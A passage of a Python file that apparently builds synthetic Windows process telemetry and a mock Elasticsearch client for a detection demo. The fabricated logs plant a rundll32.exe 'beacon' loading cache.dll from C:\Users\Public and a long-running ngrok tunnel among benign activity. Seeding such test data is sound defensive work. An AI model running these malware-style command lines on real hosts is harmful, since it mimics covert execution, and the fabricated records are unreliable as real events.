        day = start_day + timedelta(days=i)
        if day.weekday() >= 5 or i < 6:
            continue
        th = g.virtual("taskhostw.exe", r"C:\Windows\System32\taskhostw.exe")
        bt = day + timedelta(hours=9, minutes=30)
        while bt < day + timedelta(hours=17, minutes=30):
            g.spawn(th, "python.exe", bt, "li.wang", HOST_OF["li.wang"], r"C:\Users\li.wang\scripts\poll_ci.py --quiet",
                    seconds=g.rng.uniform(1, 3))
            bt += timedelta(seconds=120 + g.rng.uniform(-1.5, 1.5))

    # ⚛️ a dev tunnel left running for days (grey area, signed)
    c = ctx_for("dave.kim", _weekday_back(today, 9))
    if c:
        tt = _weekday_back(today, 9) + timedelta(hours=15)
        cm = g.spawn(c["explorer"], "cmd.exe", tt, "dave.kim", HOST_OF["dave.kim"], cmd="cmd.exe /c start ngrok http 3000",
                     seconds=1.1)
        g.spawn(cm, "ngrok.exe", tt + timedelta(seconds=0.5), "dave.kim", HOST_OF["dave.kim"], "http 3000",
                exe=r"C:\Users\dave.kim\tools\ngrok.exe", signer="ngrok LLC", running=True)

    for d in g.docs:
        d["process"].pop("_end_dt", None)
    g.docs.sort(key=lambda d: (d["@timestamp"], d["process"]["entity_id"]))
    return g.docs


# ───────────────────────── live feed ─────────────────────────
class _Live:
    def __init__(self, now):
        self.g = _Gen(now, seed=random.randrange(1 << 30))
        self.last = now
        self.next_beacon = now + timedelta(seconds=8)
        self.th = self.g.virtual("taskhostw.exe", r"C:\Windows\System32\taskhostw.exe")
        self.ex = {u: self.g.virtual("explorer.exe", r"C:\Windows\explorer.exe") for u in HOST_OF}

    def produce(self, now):
        g = self.g
        g.now = now
        span = (now - self.last).total_seconds()
        if span < 0.5:
            return
        for _ in range(g.rng.randint(1, 6)):
            u = g.rng.choice(list(HOST_OF))
            p = TRANS[DEPT_OF[u]]
            name = g.rng.choice(list(p["<s>"]))
            g.spawn(self.ex[u], name, self.last + timedelta(seconds=span * g.rng.random()), u, HOST_OF[u],
                    _tail(name, g.rng, u))
        while self.next_beacon <= now:   # accelerated beacon so it shows up in a demo
            g.spawn(self.th, "rundll32.exe", self.next_beacon, "sara.kim", HOST_OF["sara.kim"],
                    r"C:\Users\Public\Libraries\cache.dll,Start", seconds=2)
            self.next_beacon += timedelta(seconds=10 * g.rng.uniform(0.8, 1.2))
        self.last = now
        del g.docs[:-1500]


# ───────────────────────── the fake client ─────────────────────────
class MockElastic:
    def __init__(self):
        self.docs = generate(datetime.now(UTC))
        self._ms = [ms(parse(d["@timestamp"])) for d in self.docs]
        self._key = [(m, d["process"]["entity_id"]) for m, d in zip(self._ms, self.docs)]
        self._live = None
        self._rng = random.Random(3)

    def respond(self, name, params):
        return getattr(self, f"_q_{name}")(**params)

    def _lo(self, since):
        import re
        m = re.fullmatch(r"now-(\d+)([hd])", since or "now-21d")
        n, u = int(m.group(1)), m.group(2)
        lo = datetime.now(UTC) - (timedelta(hours=n) if u == "h" else timedelta(days=n))
        return bisect.bisect_left(self._ms, ms(lo))

    def _resp(self, hits, total, aggs=None):
        r = {"took": self._rng.randint(5, 80), "timed_out": False,
             "_shards": {"total": 3, "successful": 3, "skipped": 0, "failed": 0},
             "hits": {"total": {"value": total, "relation": "eq"}, "max_score": None, "hits": hits}}
        if aggs is not None:
            r["aggregations"] = aggs
        return r

    def _hit(self, i):
        d = self.docs[i]
        return {"_index": INDEX_NAME, "_id": hashlib.sha1(d["process"]["entity_id"].encode()).hexdigest()[:20],
                "_score": None, "_source": d, "sort": [self._key[i][0], self._key[i][1]]}

    def _q_fleet_overview(self, since="now-21d"):
        lo = self._lo(since)
        docs = self.docs[lo:]
        hosts = {d["host"]["name"] for d in docs}
        users = {d["user"]["name"] for d in docs}
        return self._resp([], len(docs), {"hosts": {"value": len(hosts)}, "users": {"value": len(users)},
                                          "first": {"value_as_string": docs[0]["@timestamp"] if docs else None},
                                          "last": {"value_as_string": docs[-1]["@timestamp"] if docs else None}})

    def _q_fleet_processes(self, since="now-21d", page_size=5000, search_after=None):
        lo = self._lo(since)
        total = len(self.docs) - lo
        if search_after:
            lo = max(lo, bisect.bisect_right(self._key, (int(search_after[0]), str(search_after[1]))))
        hi = min(len(self.docs), lo + page_size)
        return self._resp([self._hit(i) for i in range(lo, hi)], total)

    def _q_live_since(self, since_ts, size=500):
        if self._live is None:
            self._live = _Live(datetime.now(UTC))
        self._live.produce(datetime.now(UTC))
        lo = parse(since_ts)
        docs = sorted((d for d in self._live.g.docs if parse(d["@timestamp"]) > lo), key=lambda d: d["@timestamp"])
        docs = docs[:size]
        for d in docs:
            d["process"].pop("_end_dt", None)
        return self._resp([{"_index": INDEX_NAME, "_id": d["process"]["entity_id"], "_source": d,
                            "sort": [ms(parse(d["@timestamp"]))]} for d in docs], len(docs))
